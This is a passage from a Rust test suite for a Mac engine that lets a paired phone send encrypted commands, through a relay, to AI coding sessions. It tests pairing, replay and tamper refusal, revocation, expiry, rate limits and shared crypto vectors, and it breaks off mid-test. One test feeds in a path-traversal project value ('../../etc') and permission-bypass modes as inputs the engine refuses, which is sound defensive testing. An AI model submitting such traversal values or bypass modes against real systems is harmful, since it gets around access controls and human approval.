//! The Mac's half of the threat model and the rules, against a fake relay and a fake app; and the shared vectors.

use crate::live;
use crate::mac::{ChatView, Engine, Host, RelayApi, Saved};
use crate::proto::{self, Claim, Dir, Envelope, Identity};
use crate::rules::{self, Answer, Cli, Delivery, Need, Project, SessionInfo, Start, project_id};
use serde_json::{Value, json};
use std::sync::Mutex;

// ---------------------------------------------------------------- fakes

#[derive(Default)]
struct FakeRelay {
    calls: Mutex<Vec<(String, Value)>>,
    /// Functions that answer `{ok: false}`.
    refuse: Mutex<Vec<&'static str>>,
}

impl RelayApi for FakeRelay {
    fn mutation(&self, name: &str, args: Value) -> anyhow::Result<Value> {
        self.calls.lock().unwrap().push((name.to_string(), args));
        if self.refuse.lock().unwrap().contains(&name) {
            return Ok(json!({"ok": false, "code": "unreachable"}));
        }
        Ok(json!({"ok": true}))
    }
}

impl FakeRelay {
    fn sent(&self) -> Vec<Value> {
        self.calls.lock().unwrap().iter().filter(|(n, _)| n == "send").map(|(_, a)| a.clone()).collect()
    }
}

#[derive(Default)]
struct FakeHost {
    calls: Mutex<Vec<String>>,
    answers: Mutex<Vec<Answer>>,
    starts: Mutex<Vec<(String, Cli, String)>>,
    needs: Mutex<Vec<Need>>,
    /// Minor 1: the starts' models and how many images each send or start carried.
    models: Mutex<Vec<Option<String>>>,
    atts: Mutex<Vec<Value>>,
    /// The fake chat's events: (seq, item). `chat_view` returns those after the cursor.
    events: Mutex<Vec<(u64, Value)>>,
    live: Mutex<Value>,
    frames: Mutex<Vec<Vec<u8>>>,
    stored: Mutex<Vec<(usize, &'static str)>>,
    /// Minor 2.
    meta: Mutex<Value>,
    notes: Mutex<Vec<String>>,
    model: Mutex<Vec<String>>,
    heard: Mutex<Vec<(usize, &'static str)>>,
    outq: Mutex<Vec<(String, String, Value)>>,
}

const PROJECT: &str = "/private/tmp/coool-remote-test/app";

impl Host for FakeHost {
    fn sessions(&self) -> Vec<SessionInfo> {
        vec![
            SessionInfo::new("claude:chat1", "Invented chat", "app", Cli::Claude, "idle", "haiku", 5, true),
            SessionInfo::new("claude:term", "A terminal session", "app", Cli::Claude, "idle", "", 4, false),
        ]
    }
    fn needs(&self) -> Vec<Need> {
        self.needs.lock().unwrap().clone()
    }
    fn projects(&self) -> Vec<Project> {
        vec![Project { id: project_id(PROJECT), name: "app".into(), path: PROJECT.into() }]
    }
    fn default_mode(&self, _: Cli) -> Option<String> {
        // The person's default is Bypass: a remote start must not use it.
        Some("bypassPermissions".into())
    }
    fn chat_tail(&self, _: &str, _: usize) -> Result<Value, String> {
        Ok(json!([]))
    }
    fn answer(&self, need: &Need, a: &Answer, by: &str) -> Result<(), String> {
        self.calls.lock().unwrap().push(format!("answer {} by {by}", need.id));
        self.answers.lock().unwrap().push(a.clone());
        Ok(())
    }
    fn send(&self, s: &str, text: &str, how: Delivery, atts: &[Value], by: &str) -> Result<Option<String>, String> {
        self.calls.lock().unwrap().push(format!("send {s} {text} by {by}{}", if how == Delivery::Send { String::new() } else { format!(" ({how:?})") }));
        self.atts.lock().unwrap().extend(atts.iter().cloned());
        Ok((how != Delivery::Send).then(|| "note-1".to_string()))
    }
    fn stop(&self, s: &str, by: &str) -> Result<(), String> {
        self.calls.lock().unwrap().push(format!("stop {s} by {by}"));
        Ok(())
    }
    fn start(&self, s: &Start, atts: &[Value], by: &str) -> Result<String, String> {
        self.calls.lock().unwrap().push(format!("start by {by}"));
        self.starts.lock().unwrap().push((s.project.path.clone(), s.cli, s.mode.to_string()));
        self.models.lock().unwrap().push(s.model.clone());
        self.atts.lock().unwrap().extend(atts.iter().cloned());
        Ok("claude:new".into())
    }
    fn changed(&self) {}
    fn models(&self, cli: Cli) -> Vec<String> {
        match cli {
            Cli::Claude => vec!["haiku".into(), "sonnet".into()],
            Cli::Codex => vec!["gpt-5-codex".into()],
        }
    }
    fn options(&self) -> Value {
        json!({"claude": {"models": [{"id": "haiku", "label": "Haiku"}], "modes": ["default", "acceptEdits", "plan"]}})
    }
    fn overview(&self) -> Value {
        json!({"projects": [{"name": "app", "working": 1}], "usage": {"claude": {"windows": [{"label": "Session", "percent": 40}]}}})
    }
    fn chat_view(&self, session: &str, since: Option<u64>) -> Result<ChatView, String> {
        if session != "claude:chat1" {
            return Err("only chats coool runs".into());
        }
        let ev = self.events.lock().unwrap();
        let items = ev.iter().filter(|(q, _)| since.is_none_or(|c| *q > c)).map(|(_, v)| v.clone()).collect();
        Ok(ChatView { items, cursor: ev.last().map(|(q, _)| *q).unwrap_or(0), live: self.live.lock().unwrap().clone(), meta: self.meta.lock().unwrap().clone() })
    }
    fn chat_image(&self, session: &str, key: &str) -> Result<Vec<u8>, String> {
        if session == "claude:chat1" && key == "k1" { Ok(vec![0xff, 0xd8, 0xff, 1, 2, 3]) } else { Err("no such image".into()) }
    }
    fn device_frame(&self, _session: &str, device: &str) -> Result<Option<Vec<u8>>, String> {
        if device != "browser" {
            return Err("that panel isn't open".into());
        }
        Ok(self.frames.lock().unwrap().pop())
    }
    fn store_image(&self, img: &live::Image) -> Result<Value, String> {
        assert_ne!(img.kind, live::Kind::Audio, "a recording is never stored as an attachment");
        self.stored.lock().unwrap().push((img.bytes.len(), img.mime));
        Ok(json!({"name": format!("iPhone file.{}", img.ext.clone().unwrap_or("png".into())), "mime": img.mime, "size": img.bytes.len(), "kind": if img.kind == live::Kind::File { "file" } else { "image" }, "key": "abc"}))
    }
    fn note(&self, session: &str, n: &rules::NoteAction, by: &str) -> Result<(), String> {
        if n.note != "note-1" {
            return Err("no such queued note in that chat".into());
        }
        self.notes.lock().unwrap().push(format!("{} {session} {} by {by}", if n.now { "now" } else { "cancel" }, n.note));
        Ok(())
    }
    fn chat_models(&self, session: &str) -> Vec<String> {
        if session == "claude:chat1" { vec!["haiku".into(), "sonnet".into()] } else { vec![] }
    }
    fn set_model(&self, session: &str, model: &str, by: &str) -> Result<(), String> {
        self.model.lock().unwrap().push(format!("{session} {model} by {by}"));
        Ok(())
    }
    fn transcribe(&self, job: crate::Transcribe) -> Result<(), String> {
        self.heard.lock().unwrap().push((job.audio.len(), job.mime));
        self.outq.lock().unwrap().push((job.device.clone(), "result".into(), json!({"of": job.of, "t": "transcribe", "ok": true, "text": "add a retry", "heard": "words"})));
        Ok(())
    }
    fn outbox(&self) -> Vec<(String, String, Value)> {
        std::mem::take(&mut *self.outq.lock().unwrap())
    }
}

impl FakeHost {
    fn calls(&self) -> Vec<String> {
        self.calls.lock().unwrap().clone()
    }
}

/// A phone: its keys and counter, sealing messages for the Mac and opening the Mac's.
struct TestPhone {
    id: Identity,
    device_id: String,
    counter: u64,
}

impl TestPhone {
    fn new() -> Self {
        TestPhone { id: Identity::generate(), device_id: proto::random_id(), counter: 0 }
    }
    fn keys(&self, mac: &Engine, mac_box_pub: &str) -> proto::SessionKeys {
        let shared = self.id.shared(mac_box_pub).unwrap();
        proto::session_keys(shared.as_ref(), mac.mac_id(), &self.device_id, mac_box_pub, &self.id.box_pub())
    }
    /// (counter, ciphertext) of a message sent `age_ms` ago.
    fn seal(&mut self, mac: &Engine, mac_box_pub: &str, t: &str, b: Value, now: u64, age_ms: u64) -> (u64, String) {
        self.counter = proto::next_counter(self.counter, now);
        let env = serde_json::to_vec(&Envelope::new(t, b, now - age_ms)).unwrap();
        let ct = proto::seal(self.keys(mac, mac_box_pub).d2m.as_ref(), Dir::D2m, mac.mac_id(), &self.device_id, self.counter, &env).unwrap();
        (self.counter, ct)
    }
    /// The Mac's messages to this phone among the relay calls, decrypted.
    fn received(&self, mac: &Engine, mac_box_pub: &str, relay: &FakeRelay) -> Vec<Envelope> {
        let k = self.keys(mac, mac_box_pub);
        relay
            .sent()
            .into_iter()
            .filter(|a| a["deviceId"] == self.device_id.as_str())
            .map(|a| {
                let pt = proto::open(k.m2d.as_ref(), Dir::M2d, mac.mac_id(), &self.device_id, a["counter"].as_u64().unwrap(), a["ciphertext"].as_str().unwrap()).unwrap();
                serde_json::from_slice(&pt).unwrap()
            })
            .collect()
    }
}

const NOW: u64 = 1_763_640_000_000;

/// A Mac with one phone paired through the real pairing steps (claim checked, then the click).
fn paired() -> (Engine, String, FakeRelay, FakeHost, TestPhone) {
    let mac_id = Identity::generate();
    let mac_box_pub = mac_id.box_pub();
    let mut mac = Engine::new(Saved { enabled: true, relay: "https://example.convex.cloud".into(), ..Default::default() }, mac_id, None);
    let relay = FakeRelay::default();
    let host = FakeHost::default();
    let view = mac.pair_start(&relay, NOW).unwrap();
    let mut phone = TestPhone::new();
    let claim = claim_for(&view.url, &phone, "Ada's iPhone", None);
    mac.handle_inbox(&relay, &host, &json!({"ok": true, "claims": [claim], "messages": [], "devices": []}), NOW);
    let code = mac.status(NOW).pairing.unwrap().claim.unwrap().code;
    assert_eq!(code.len(), 6);
    assert!(mac.saved.devices.is_empty(), "not paired before the click");
    mac.pair_confirm(&relay, NOW).unwrap();
    assert_eq!(mac.saved.devices.len(), 1);
    phone.counter = 0;
    (mac, mac_box_pub, relay, host, phone)
}

fn query(url: &str, k: &str) -> String {
    url.split(['?', '&']).find_map(|p| p.strip_prefix(&format!("{k}="))).unwrap().to_string()
}

/// The phone's claim of the pairing in `url` (as remote/phone/src/phone.mjs makes it). `secret`: a wrong one.
fn claim_for(url: &str, phone: &TestPhone, name: &str, secret: Option<[u8; 32]>) -> Value {
    let s = secret.map(|s| s.to_vec()).unwrap_or_else(|| proto::unb64u(&query(url, "s"), Some(32)).unwrap());
    let k = proto::pairing_keys(&s);
    let pairing_id = query(url, "p");
    let name_box = proto::seal_name(k.name.as_ref(), &pairing_id, &phone.device_id, name, [1; 12]);
    let mut c = Claim { pairing_id, device_id: phone.device_id.clone(), sign_pub: phone.id.sign_pub(), box_pub: phone.id.box_pub(), name_box, proof_mac: String::new() };
    c.proof_mac = proto::proof(k.mac.as_ref(), &c);
    serde_json::to_value(&c).unwrap()
}

fn deliver(mac: &mut Engine, relay: &FakeRelay, host: &FakeHost, phone: &TestPhone, counter: u64, ct: &str, now: u64) {
    let inbox = json!({"ok": true, "claims": [], "devices": [], "messages": [{"deviceId": phone.device_id, "counter": counter, "ciphertext": ct, "createdAt": now}]});
    mac.handle_inbox(relay, host, &inbox, now);
}

fn results(phone: &TestPhone, mac: &Engine, mbp: &str, relay: &FakeRelay) -> Vec<Value> {
    phone.received(mac, mbp, relay).into_iter().filter(|e| e.t == "result").map(|e| e.b).collect()
}

// ---------------------------------------------------------------- pairing

#[test]
fn pairing_does_not_complete_without_the_click() {
    let id = Identity::generate();
    let mut mac = Engine::new(Saved { relay: "https://example.convex.cloud".into(), ..Default::default() }, id, None);
    let (relay, host) = (FakeRelay::default(), FakeHost::default());
    assert!(mac.pair_confirm(&relay, NOW).is_err(), "nothing to confirm");
    let view = mac.pair_start(&relay, NOW).unwrap();
    assert!(mac.pair_confirm(&relay, NOW).is_err(), "no claim yet");
    let phone = TestPhone::new();
    mac.handle_inbox(&relay, &host, &json!({"ok": true, "claims": [claim_for(&view.url, &phone, "Phone", None)], "messages": []}), NOW);
    assert!(mac.status(NOW).pairing.unwrap().claim.is_some());
    assert!(mac.saved.devices.is_empty());
    assert!(!relay.calls.lock().unwrap().iter().any(|(n, _)| n == "confirmPairing"));
    // Cancel instead of Pair: no device, and the relay is told.
    mac.pair_cancel(&relay, NOW);
    assert!(mac.saved.devices.is_empty());
    assert!(relay.calls.lock().unwrap().iter().any(|(n, _)| n == "cancelPairing"));
    assert!(mac.pair_confirm(&relay, NOW).is_err());
}

#[test]
fn a_claim_without_the_secret_is_ignored() {
    let id = Identity::generate();
    let mut mac = Engine::new(Saved { relay: "https://example.convex.cloud".into(), ..Default::default() }, id, None);
    let (relay, host) = (FakeRelay::default(), FakeHost::default());
    let view = mac.pair_start(&relay, NOW).unwrap();
    let phone = TestPhone::new();
    mac.handle_inbox(&relay, &host, &json!({"ok": true, "claims": [claim_for(&view.url, &phone, "Guess", Some([7; 32]))], "messages": []}), NOW);
    assert!(mac.status(NOW).pairing.unwrap().claim.is_none());
    assert!(mac.pair_confirm(&relay, NOW).is_err());
}

#[test]
fn the_pairing_code_expires_after_two_minutes() {
    let id = Identity::generate();
    let mut mac = Engine::new(Saved { relay: "https://example.convex.cloud".into(), ..Default::default() }, id, None);
    let relay = FakeRelay::default();
    let v = mac.pair_start(&relay, NOW).unwrap();
    assert_eq!(v.expires_at, NOW + 120_000);
    assert!(mac.status(NOW + 121_000).pairing.is_none());
}

// ---------------------------------------------------------------- messages

#[test]
fn a_message_is_acted_on_once_and_a_replay_is_refused() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let (c, ct) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": "hello"}), NOW, 0);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW + 10);
    assert_eq!(host.calls(), vec!["send claude:chat1 hello by Ada's iPhone"]);
    // An older message (lower counter) after a newer one: refused too.
    let (c2, ct2) = phone.seal(&mac, &mbp, "stop", json!({"session": "claude:chat1"}), NOW, 0);
    let (c3, ct3) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": "later"}), NOW, 0);
    deliver(&mut mac, &relay, &host, &phone, c3, &ct3, NOW);
    deliver(&mut mac, &relay, &host, &phone, c2, &ct2, NOW);
    assert_eq!(host.calls().len(), 2);
    // And acknowledged, so the relay deletes them.
    assert!(relay.calls.lock().unwrap().iter().any(|(n, a)| n == "ack" && a["dir"] == "d2m" && a["upTo"].as_u64() == Some(c)));
}

#[test]
fn a_tampered_or_misrouted_message_is_refused() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let (c, ct) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": "x"}), NOW, 0);
    let mut b = proto::unb64u(&ct, None).unwrap();
    b[0] ^= 1;
    deliver(&mut mac, &relay, &host, &phone, c, &proto::b64u(&b), NOW);
    // Sealed for another counter than the one it arrives under.
    deliver(&mut mac, &relay, &host, &phone, c + 1, &ct, NOW);
    assert!(host.calls().is_empty());
    assert!(mac.actions.iter().all(|a| a.kind == "refused"));
    // The untouched one still works (the bad ones didn't move the high-water mark).
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    assert_eq!(host.calls().len(), 1);
}

#[test]
fn a_removed_device_is_refused_on_the_mac_even_if_the_relay_still_delivers() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    // The relay can't be reached: the Mac removes the device anyway and keeps the revocation to retry.
    relay.refuse.lock().unwrap().push("revokeDevice");
    let (c, ct) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": "x"}), NOW, 0);
    mac.remove_device(Some(&relay), &phone.device_id.clone(), NOW).unwrap();
    assert_eq!(mac.saved.pending_revokes, vec![phone.device_id.clone()]);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    assert!(host.calls().is_empty());
    assert_eq!(mac.actions.last().unwrap().kind, "refused");
    // Nothing goes to it either.
    host.needs.lock().unwrap().push(perm_need());
    let before = relay.sent().len();
    mac.tick(&relay, &host, NOW);
    assert_eq!(relay.sent().len(), before);
    // Retried once the relay answers.
    relay.refuse.lock().unwrap().clear();
    mac.flush_revokes(&relay, NOW);
    assert!(mac.saved.pending_revokes.is_empty());
}

#[test]
fn a_command_older_than_sixty_seconds_is_dropped_and_reported_expired() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let (c, ct) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": "old"}), NOW, 61_000);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    assert!(host.calls().is_empty());
    let r = results(&phone, &mac, &mbp, &relay);
    assert_eq!(r.last().unwrap()["error"], "expired");
    // Fresh by the phone's clock but queued at the relay over a minute ago (the Mac was asleep): dropped too.
    let (c, ct) = phone.seal(&mac, &mbp, "stop", json!({"session": "claude:chat1"}), NOW, 0);
    let inbox = json!({"ok": true, "messages": [{"deviceId": phone.device_id, "counter": c, "ciphertext": ct, "createdAt": NOW - 61_000}]});
    mac.handle_inbox(&relay, &host, &inbox, NOW);
    assert!(host.calls().is_empty());
}

fn perm_need() -> Need {
    Need { command: Some("echo hi".into()), ..Need::new("1:req-1", "claude:chat1", "permission", "Bash", "Run echo") }
}

#[test]
fn an_answer_can_only_allow_once_or_deny() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    host.needs.lock().unwrap().push(perm_need());
    for b in [json!({"need": "1:req-1", "choice": "always"}), json!({"need": "1:req-1", "choice": "remember", "remember": "chat-edits"}), json!({"need": "1:req-1", "choice": "option", "option": "Always allow"})] {
        let (c, ct) = phone.seal(&mac, &mbp, "answer", b, NOW, 0);
        deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    }
    assert!(host.answers.lock().unwrap().is_empty());
    assert!(results(&phone, &mac, &mbp, &relay).iter().all(|r| r["ok"] == false));
    let (c, ct) = phone.seal(&mac, &mbp, "answer", json!({"need": "1:req-1", "choice": "allow_once", "remember": "project-rule", "always": true}), NOW, 0);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    assert_eq!(*host.answers.lock().unwrap(), vec![Answer::AllowOnce]);
    assert_eq!(mac.actions.last().unwrap().detail, "allowed Bash");
    assert_eq!(mac.actions.last().unwrap().device, "Ada's iPhone");
}

#[test]
fn start_refuses_unknown_projects_and_paths_and_never_bypasses() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    for b in [
        json!({"project": project_id("/somewhere/else"), "cli": "claude", "text": "hi"}),
        json!({"project": PROJECT, "cli": "claude", "text": "hi"}),
        json!({"project": project_id(PROJECT), "path": "/", "cli": "claude", "text": "hi"}),
        json!({"project": "../../etc", "cli": "claude", "text": "hi"}),
    ] {
        let (c, ct) = phone.seal(&mac, &mbp, "start", b, NOW, 0);
        deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    }
    assert!(host.starts.lock().unwrap().is_empty());
    // A minute on (the refused starts count against the limit of five a minute).
    let later = NOW + 61_000;
    let (c, ct) = phone.seal(&mac, &mbp, "start", json!({"project": project_id(PROJECT), "cli": "claude", "text": "hi"}), later, 0);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, later);
    // Minor 1: a mode the phone names must be an asking one; Bypass and full access are refused, not swapped.
    for (cli, mode) in [("codex", "danger-full-access"), ("codex", "never"), ("claude", "bypassPermissions"), ("claude", "dontAsk"), ("claude", "")] {
        let (c, ct) = phone.seal(&mac, &mbp, "start", json!({"project": project_id(PROJECT), "cli": cli, "text": "hi", "mode": mode}), later, 0);
        deliver(&mut mac, &relay, &host, &phone, c, &ct, later);
    }
    assert_eq!(*host.starts.lock().unwrap(), vec![(PROJECT.to_string(), Cli::Claude, "default".to_string())]);
    let refused = results(&phone, &mac, &mbp, &relay);
    assert_eq!(refused.iter().filter(|r| r["error"] == "a chat started from the phone can't use that mode").count(), 4, "{refused:?}");
}

#[test]
fn send_and_stop_reach_only_chats_coool_runs() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    for (t, b) in [("send", json!({"session": "claude:term", "text": "x"})), ("stop", json!({"session": "claude:term"})), ("send", json!({"session": "nope", "text": "x"}))] {
        let (c, ct) = phone.seal(&mac, &mbp, t, b, NOW, 0);
        deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    }
    assert!(host.calls().is_empty());
}

#[test]
fn commands_are_rate_limited_per_device() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    for i in 0..25 {
        let (c, ct) = phone.seal(&mac, &mbp, "send", json!({"session": "claude:chat1", "text": format!("m{i}")}), NOW, 0);
        deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW + i);
    }
    assert_eq!(host.calls().len(), 20);
}

#[test]
fn hello_gets_a_snapshot_and_changes_follow() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let (c, ct) = phone.seal(&mac, &mbp, "hello", json!({}), NOW, 0);
    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
    let got = phone.received(&mac, &mbp, &relay);
    let snap = got.iter().find(|e| e.t == "snapshot").unwrap();
    assert_eq!(snap.b["sessions"].as_array().unwrap().len(), 2);
    let projects = got.iter().find(|e| e.t == "projects").unwrap();
    assert_eq!(projects.b["projects"][0]["id"], project_id(PROJECT).as_str());
    assert!(!serde_json::to_string(&projects.b).unwrap().contains("/private/tmp"), "no path goes to the phone");
    mac.tick(&relay, &host, NOW);
    host.needs.lock().unwrap().push(perm_need());
    mac.tick(&relay, &host, NOW + 1000);
    host.needs.lock().unwrap().clear();
    mac.tick(&relay, &host, NOW + 2000);
    let ts: Vec<String> = phone.received(&mac, &mbp, &relay).into_iter().map(|e| e.t).collect();
    assert!(ts.contains(&"need".to_string()) && ts.contains(&"need_gone".to_string()));
}

#[test]
fn every_relay_request_is_signed_by_the_mac() {
    let (mac, _mbp, relay, _host, _phone) = paired();
    let _ = mac;
    for (name, a) in relay.calls.lock().unwrap().iter() {
        assert!(a["sig"].as_str().is_some_and(|s| s.len() == 86), "{name} unsigned");
    }
}

// ---------------------------------------------------------------- vectors

#[test]
fn matches_the_shared_vectors() {
    let v: Value = serde_json::from_str(include_str!("../tests/vectors.json")).unwrap();
    let s = |k: &str| v[k].as_str().unwrap().to_string();
    let key = |p: &str| proto::key32(v.pointer(p).unwrap().as_str().unwrap()).unwrap();
    let mac = Identity::from_raw(&key("/mac/boxPriv"), &key("/mac/signPriv"));
    let dev = Identity::from_raw(&key("/dev/boxPriv"), &key("/dev/signPriv"));
    assert_eq!(mac.box_pub(), v["mac"]["boxPub"]);
    assert_eq!(mac.sign_pub(), v["mac"]["signPub"]);
    assert_eq!(dev.box_pub(), v["dev"]["boxPub"]);
    let k = proto::pairing_keys(&proto::unb64u(&s("secret"), Some(32)).unwrap());
    assert_eq!(proto::b64u(k.relay.as_ref()), s("relayKey"));
    let c = Claim { pairing_id: s("pairingId"), device_id: s("deviceId"), sign_pub: dev.sign_pub(), box_pub: dev.box_pub(), name_box: s("nameBox"), proof_mac: s("proofMac") };
    assert!(proto::proof_ok(k.mac.as_ref(), &c));
    assert_eq!(proto::proof(k.relay.as_ref(), &c), s("proofRelay"));
    assert_eq!(proto::open_name(k.name.as_ref(), &c.pairing_id, &c.device_id, &c.name_box).unwrap(), "Ada's iPhone");
    assert_eq!(proto::seal_name(k.name.as_ref(), &c.pairing_id, &c.device_id, "Ada's iPhone", [5; 12]), s("nameBox"));
    let code = proto::pairing_code(k.code.as_ref(), &proto::CodeInput { pairing_id: &c.pairing_id, mac_id: &s("macId"), mac_sign_pub: &mac.sign_pub(), mac_box_pub: &mac.box_pub(), device_id: &c.device_id, dev_sign_pub: &dev.sign_pub(), dev_box_pub: &dev.box_pub() });
    assert_eq!(code, s("code"));
    let shared = mac.shared(&dev.box_pub()).unwrap();
    assert_eq!(proto::b64u(shared.as_ref()), s("shared"));
    let sk = proto::session_keys(shared.as_ref(), &s("macId"), &s("deviceId"), &mac.box_pub(), &dev.box_pub());
    assert_eq!(proto::b64u(sk.m2d.as_ref()), s("m2d"));
    assert_eq!(proto::b64u(sk.d2m.as_ref()), s("d2m"));
    let counter = v["counter"].as_u64().unwrap();
    assert_eq!(proto::seal(sk.d2m.as_ref(), Dir::D2m, &s("macId"), &s("deviceId"), counter, s("envelope").as_bytes()).unwrap(), s("sealedD2m"));
    let pt = proto::open(sk.d2m.as_ref(), Dir::D2m, &s("macId"), &s("deviceId"), counter, &s("sealedD2m")).unwrap();
    assert_eq!(String::from_utf8(pt).unwrap(), s("envelope"));
    let fields = [s("macId"), s("deviceId"), "m2d".into(), counter.to_string(), proto::sha256_hex("abc")];
    let fields: Vec<&str> = fields.iter().map(String::as_str).collect();
    assert_eq!(mac.sign(&proto::request_bytes("send", &fields, 1763640000000)), s("requestSig"));
    assert_eq!(proto::pair_url("https://example.convex.cloud", &s("macId"), &s("pairingId"), &s("secret"), &mac.sign_pub(), &mac.box_pub()), s("pairUrl"));
    // Minor 1: an image's upload parts, and the last one sealed.
    let mut bytes = b"\x89PNG\r\n\x1a\n".to_vec();
    bytes.extend(std::iter::repeat_n(7u8, live::CHUNK));
    let parts = live::chunks(&bytes, &json!({"upload": "0f0e0d0c0b0a09080706050403020100"}));
    let want = v["uploadParts"].as_array().unwrap();
    assert_eq!(parts.len(), want.len());
    for (p, w) in parts.iter().zip(want) {
        for k in ["upload", "part", "parts", "size"] {
            assert_eq!(p[k], w[k], "{k}");
        }
        assert_eq!(proto::sha256_hex(p["data"].as_str().unwrap()), w["dataSha256"].as_str().unwrap());
    }
    let env: Envelope = serde_json::from_str(&s("uploadEnvelope")).unwrap();
    assert_eq!(env.b, parts[1]);
    assert_eq!(proto::seal(sk.d2m.as_ref(), Dir::D2m, &s("macId"), &s("deviceId"), counter + 1, s("uploadEnvelope").as_bytes()).unwrap(), s("sealedUpload"));
    // The Mac takes those parts as one image.
    let mut u = live::Uploads::default();
    assert_eq!(u.take("d", &parts[0], 0), Ok(live::Step::More));
    assert!(matches!(u.take("d", &parts[1], 0), Ok(live::Step::Done(ref i)) if i.bytes == bytes && i.mime == "image/png"));
}

#[test]
fn identity_round_trips_through_the_key_store_form() {
    let id = Identity::generate();
    let back = Identity::import(&id.export()).unwrap();
    assert_eq!(back.sign_pub(), id.sign_pub());
    assert_eq!(back.box_pub(), id.box_pub());
    assert!(Identity::import("v2.a.b").is_err());
}

#[test]
fn a_low_order_peer_key_is_refused() {
    let id = Identity::generate();
    assert!(id.shared(&proto::b64u(&[0u8; 32])).is_err());
}

// ---------------------------------------------------------------- minor 1

fn send_all(mac: &mut Engine, mbp: &str, relay: &FakeRelay, host: &FakeHost, phone: &mut TestPhone, msgs: Vec<(&str, Value)>, now: u64) {
    for (t, b) in msgs {
        let (c, ct) = phone.seal(mac, mbp, t, b, now, 0);
        deliver(mac, relay, host, phone, c, &ct, now);
    }
}

#[test]
fn a_start_takes_a_model_and_mode_the_mac_offers() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    let p = project_id(PROJECT);
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
        ("start", json!({"project": p, "cli": "claude", "text": "hi", "model": "haiku", "mode": "plan"})),
        ("start", json!({"project": p, "cli": "claude", "text": "hi", "model": "claude-opus-9-unknown"})),
        ("start", json!({"project": p, "cli": "codex", "text": "hi", "model": "haiku"})),
        ("start", json!({"project": p, "cli": "codex", "text": "hi", "model": "gpt-5-codex", "mode": "on-request"})),
    ], NOW);
    assert_eq!(*host.starts.lock().unwrap(), vec![(PROJECT.to_string(), Cli::Claude, "plan".to_string()), (PROJECT.to_string(), Cli::Codex, "on-request".to_string())]);
    assert_eq!(*host.models.lock().unwrap(), vec![Some("haiku".to_string()), Some("gpt-5-codex".to_string())]);
    let rs = results(&phone, &mac, &mbp, &relay);
    assert_eq!(rs.iter().filter(|r| r["error"] == "not a model this Mac offers").count(), 2);
    assert_eq!(rs[0]["model"], "haiku");
}

#[test]
fn hello_with_minor_gets_options_and_overview_and_an_old_phone_does_not() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x"}))], NOW);
    let ts: Vec<String> = phone.received(&mac, &mbp, &relay).into_iter().map(|e| e.t).collect();
    assert_eq!(ts, vec!["snapshot", "projects"], "an older phone gets only what it knows");
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x", "minor": 1}))], NOW + 10);
    let got = phone.received(&mac, &mbp, &relay);
    let ts: Vec<&str> = got.iter().map(|e| e.t.as_str()).collect();
    assert_eq!(&ts[2..], ["snapshot", "projects", "options", "overview"]);
    assert_eq!(got[2].b["minor"], proto::MINOR);
    // The overview goes again only when it changed.
    mac.tick(&relay, &host, NOW + 5_000);
    mac.tick(&relay, &host, NOW + 10_000);
    let n = phone.received(&mac, &mbp, &relay).iter().filter(|e| e.t == "overview").count();
    assert_eq!(n, 2, "once at hello, once on the first tick (the engine hadn't sent it yet), then not again");
}

#[test]
fn an_unknown_message_type_is_ignored_both_ways() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("teleport", json!({"session": "claude:chat1"})), ("watch_v9", json!({}))], NOW);
    assert!(host.calls().is_empty());
    assert!(phone.received(&mac, &mbp, &relay).is_empty(), "no answer, no error: either side can be newer");
    assert!(mac.actions.is_empty());
}

#[test]
fn a_watched_chat_streams_its_changes_until_the_lease_ends() {
    let (mut mac, mbp, relay, host, mut phone) = paired();
    host.events.lock().unwrap().push((1, json!({"k": "u1", "role": "user", "text": "hi"})));
    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch", json!({"session": "claude:chat1"}))], NOW);
    let chats = |m: &Engine, r: &FakeRelay| phone.received(m, &mbp, r).into_iter().filter(|e| e.t == "chat").map(|e| e.b).collect::<Vec<_>>();
    let c = chats(&mac, &relay);
    assert_eq!(c.len(), 1);
    assert_eq!((c[0]["reset"].as_bool(), c[0]["items"][0]["k"].as_str(), c[0]["cursor"].as_u64()), (Some(true), Some("u1"), Some(1)));
    // Nothing new: nothing sent. Something new: only that.
    mac.tick(&relay, &host, NOW + 1_000);
    assert_eq!(chats(&mac, &relay).len(), 1);
    host.events.lock().unwrap().push((2, json!({"k": "t1", "role": "tool", "tool": "Edit", "text": "src/a.rs"})));
    *host.live.lock().unwrap() = json!({"text": "Writing", "step": "Edit src/a.rs"});
    mac.tick(&relay, &host, NOW + 2_000);
    let c = chats(&mac, &relay);
    assert_eq!(c.len(), 2);
